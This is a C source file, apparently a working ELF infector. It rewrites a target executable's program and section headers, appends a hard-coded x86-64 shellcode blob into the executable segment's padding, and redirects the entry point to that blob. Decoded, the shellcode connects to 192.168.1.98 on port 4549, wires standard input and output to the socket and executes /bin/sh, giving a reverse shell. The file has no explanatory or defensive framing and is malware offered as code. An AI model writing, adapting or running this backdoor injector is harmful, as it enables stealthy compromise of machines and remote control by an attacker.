#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/elf.h>
#include <linux/types.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
unsigned char code[] = {
    0x48, 0x31, 0xc0, 0x48, 0x83, 0xc0, 0x29, 0x48, 0x31, 0xff, 0x48, 0x83,
    0xc7, 0x02, 0x48, 0x31, 0xf6, 0x48, 0x83, 0xc6, 0x01, 0x48, 0x31, 0xd2,
    0x0f, 0x05, 0x4d, 0x31, 0xff, 0x49, 0x01, 0xc7, 0x48, 0x31, 0xc0, 0x50,
    0x54, 0x66, 0xc7, 0x04, 0x24, 0x02, 0x00, 0x66, 0xc7, 0x44, 0x24, 0x02,
    0x11, 0xc5, 0xc7, 0x44, 0x24, 0x04, 0xc0, 0xa8, 0x01, 0x62, 0x48, 0x83,
    0xc0, 0x2a, 0x48, 0x31, 0xff, 0x4c, 0x01, 0xff, 0x48, 0x8d, 0x34, 0x24,
    0x48, 0x31, 0xd2, 0x48, 0x83, 0xc2, 0x10, 0x0f, 0x05, 0x48, 0x31, 0xff,
    0x48, 0x83, 0xec, 0x10, 0x48, 0x31, 0xc0, 0x48, 0x31, 0xf6, 0x48, 0x83,
    0xc0, 0x21, 0x4c, 0x01, 0xff, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x48, 0x83,
    0xc0, 0x21, 0x48, 0x83, 0xc6, 0x01, 0x0f, 0x05, 0x48, 0x31, 0xc0, 0x48,
    0x31, 0xf6, 0x48, 0x83, 0xc0, 0x21, 0x48, 0x83, 0xc6, 0x02, 0x0f, 0x05,
    0x48, 0x31, 0xc0, 0x50, 0x54, 0xc7, 0x04, 0x24, 0x2f, 0x2f, 0x62, 0x69,
    0xc7, 0x44, 0x24, 0x04, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0x83, 0xc0, 0x3b,
    0x48, 0x8d, 0x3c, 0x24, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x0f, 0x05};
int wr(uint64_t *position, int fd, uint64_t *entry) {

  if (lseek(fd, *position, SEEK_SET) == -1) {
    printf("lseek position set for wrt %d %s\n", errno, strerror(errno));
    close(fd);
    exit(EXIT_FAILURE);
  }
  if (write(fd, &code, sizeof(code)) != sizeof(code)) {
    printf("wrt problem %d %s\n", errno, strerror(errno));
    close(fd);
    return -1;
  } else {
    return 0;
  }
}

int entr(uint64_t *position, int fd, uint64_t *entry, Elf64_Ehdr *ehdr) {

  ehdr->e_entry = *position;
  if (lseek(fd, 0, SEEK_SET) == -1) {
    printf("lseek for elfhdr %d %s\n", errno, strerror(errno));
    close(fd);
    exit(EXIT_FAILURE);
  }
  if (write(fd, ehdr, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) {
    printf("write for elfhdr %d %s\n", errno, strerror(errno));
    close(fd);
    exit(EXIT_FAILURE);
  } else {
    return 0;
  }
  return -1;
}

int id_fini(uint64_t *position, int fd, Elf64_Phdr *phdr, Elf64_Ehdr *ehdr,
            uint64_t *entry) {
  Elf64_Shdr shdr;

  if (lseek(fd, ehdr->e_shoff, SEEK_SET) == -1) {

    printf("lseek %d %s\n", errno, strerror(errno));
    close(fd);
    exit(EXIT_FAILURE);
  }
  for (int i = 0; i < ehdr->e_shnum; i++) {
    ssize_t rd_section = read(fd, &shdr, ehdr->e_shentsize);

    if (rd_section == -1) {

      printf("read section header troble %d %s\n", errno, strerror(errno));
      close(fd);
      exit(EXIT_FAILURE);
    }
    if (rd_section != ehdr->e_shentsize) {

      perror("shentsize prablem\n");
    }
    if (shdr.sh_type == SHT_PROGBITS) {
      if (shdr.sh_flags & SHF_ALLOC && shdr.sh_flags & SHF_EXECINSTR) {
        if (shdr.sh_offset + shdr.sh_size > phdr->p_offset &&
            phdr->p_offset + phdr->p_filesz > shdr.sh_offset) {

          if (shdr.sh_offset != 0x1000) {
            if (shdr.sh_addralign == 4) {
              *position = shdr.sh_offset + shdr.sh_size;
              shdr.sh_size = shdr.sh_size + sizeof(code);
              uint64_t sh_pos = ehdr->e_shoff + (ehdr->e_shentsize * i);
              if (lseek(fd, sh_pos, SEEK_SET) == -1) {
                printf("lseek section header pos %d %s\n", errno,
                       strerror(errno));
                close(fd);
                exit(EXIT_FAILURE);
              }
              if (write(fd, &shdr, sizeof(shdr)) != sizeof(shdr)) {

                perror("write sectior header data fail\n");
                close(fd);
                exit(EXIT_FAILURE);
              }

              return 0;
            }
          }
        }
      }
    }
  }
  return -1;
}

int id_segment(Elf64_Ehdr *ehdr, int fd, uint64_t *entry) {

  uint64_t position = 0;
  uint64_t phdr_pos;
  Elf64_Phdr phdr;

  if (lseek(fd, ehdr->e_phoff, SEEK_SET) == -1) {

    printf("open %d %s\n", errno, strerror(errno));
    close(fd);
    exit(EXIT_FAILURE);
  }
  for (int i = 0; i < ehdr->e_phnum; i++) {

    ssize_t ph_rd = read(fd, &phdr, ehdr->e_phentsize);

    if (ph_rd == -1) {

      printf("program header read %d %s\n", errno, strerror(errno));
      close(fd);
      exit(EXIT_FAILURE);
    }
    if (ph_rd != ehdr->e_phentsize) {
      perror("phdr read eof or malform\n");
    }
    if (phdr.p_type == PT_LOAD) {
      if (phdr.p_offset == 0x1000) {
        if (phdr.p_flags & PF_R && phdr.p_flags & PF_X) {
          if ((id_fini(&position, fd, &phdr, ehdr, entry)) == 0) {

            phdr_pos = ehdr->e_phoff + (ehdr->e_phentsize * i);

            if (lseek(fd, phdr_pos, SEEK_SET) == -1) {

              printf("phdr_pos lseek %d %s\n", errno, strerror(errno));
              close(fd);
              exit(EXIT_FAILURE);
            }

            position = phdr.p_offset + phdr.p_filesz;

            phdr.p_filesz += sizeof(code);
            phdr.p_memsz += sizeof(code);
            if (write(fd, &phdr, ehdr->e_phentsize) == -1) {

              printf("phdr write %d %s\n", errno, strerror(errno));
              close(fd);
              exit(EXIT_FAILURE);
            }

            if ((entr(&position, fd, entry, ehdr)) == 0) {

              if (wr(&position, fd, entry) == 0) {
                printf("[*] written\n");
                exit(EXIT_SUCCESS);

              } else {
                printf("no write\n");
              }

            } else {

              close(fd);
              printf("failed to write cc\n");
              exit(EXIT_FAILURE);
            }
          }
        }
      }
    }
  }
  close(fd);
  return -1;
}

int hdr(Elf64_Ehdr *ehdr, int fd, uint64_t *entry) {

  ssize_t ehdr_rd = read(fd, ehdr, sizeof(Elf64_Ehdr));
  if (ehdr_rd == -1) {
    printf("read ehdr -1 %d %s\n", errno, strerror(errno));
    close(fd);
    exit(EXIT_FAILURE);
  }

  if (ehdr_rd != sizeof(Elf64_Ehdr)) {
    printf("wrong read size for elf hdr\n");
    exit(EXIT_FAILURE);
    close(fd);
  }
  if (ehdr->e_ident[EI_MAG0] == ELFMAG0 && ehdr->e_ident[EI_MAG1] == ELFMAG1 &&
      ehdr->e_ident[EI_MAG2] == ELFMAG2 && ehdr->e_ident[EI_MAG3] == ELFMAG3) {
    if (ehdr->e_ident[EI_CLASS] == ELFCLASS32 ||
        ehdr->e_ident[EI_CLASS] == ELFCLASS64) {

      *entry = ehdr->e_entry;
      return 0;

    } else {
      close(fd);
      return -1;
    }
  } else {
    close(fd);
    return -1;
  }
}

int main(int argc, char *argv[]) {

  if (argc != 2) {
    perror("./mod program\n");
    exit(EXIT_FAILURE);
  }
  int fd;
  if ((fd = open(argv[1], O_RDWR)) == -1) {
    printf("open: %d %s\n", errno, strerror(errno));
    exit(EXIT_FAILURE);
  }
  uint64_t entry;
  Elf64_Ehdr ehdr;
  if ((hdr(&ehdr, fd, &entry)) == -1) {
    printf("elf hdr read\n");
    exit(EXIT_FAILURE);
  }
  if ((id_segment(&ehdr, fd, &entry)) == -1) {
    printf("id seg from main\n");
    exit(EXIT_FAILURE);
  }
  return 0;
}
